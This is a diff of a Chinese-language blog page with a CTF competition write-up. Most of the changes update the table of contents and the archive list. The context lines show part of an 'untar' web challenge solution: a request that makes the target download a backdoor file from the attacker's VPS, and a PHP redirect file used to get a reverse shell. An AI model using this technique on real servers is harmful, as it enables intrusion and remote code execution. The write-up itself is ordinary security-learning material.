@@ -411,7 +411,8 @@ height:50vh;
 <p>请求如下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.62:12507/?url=http://your_vps/backdoor.txt&amp;filename=URI/aaa.pm</span><br></pre></td></tr></table></figure></p>
 <p>然后在自己的服务器放一个跳转文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header("Location: aaa://aaa.com");</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>访问?filename=xxx&amp;url=<a href="http://your_vps/302.php" target="_blank" rel="noopener">http://your_vps/302.php</a> ，成功反弹shell<br><img src="/assets/2019hxb/6.png" alt=""></p>
-
+<h4 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h4><p>用现有的链打过去就行了<br><img src="/assets/2019hxb/7.png" alt=""></p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3>
     </article>
     <!-- license  -->
     
@@ -541,7 +542,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#give-me-your-passport"><span class="toc-number">2.1.</span> <span class="toc-text">give me your passport</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rsa"><span class="toc-number">2.2.</span> <span class="toc-text">rsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Des"><span class="toc-number">2.3.</span> <span class="toc-text">Des</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HackNote"><span class="toc-number">3.1.</span> <span class="toc-text">HackNote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NameSystem"><span class="toc-number">3.2.</span> <span class="toc-text">NameSystem</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#untar"><span class="toc-number">4.1.</span> <span class="toc-text">untar</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#give-me-your-passport"><span class="toc-number">2.1.</span> <span class="toc-text">give me your passport</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rsa"><span class="toc-number">2.2.</span> <span class="toc-text">rsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Des"><span class="toc-number">2.3.</span> <span class="toc-text">Des</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HackNote"><span class="toc-number">3.1.</span> <span class="toc-text">HackNote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NameSystem"><span class="toc-number">3.2.</span> <span class="toc-text">NameSystem</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#untar"><span class="toc-number">4.1.</span> <span class="toc-text">untar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#thinkphp"><span class="toc-number">4.2.</span> <span class="toc-text">thinkphp?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-number">5.</span> <span class="toc-text">RE</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -554,6 +555,24 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1777,12 +1796,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
         </li>
     
     
@@ -1931,12 +1950,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
         </li>
     
     
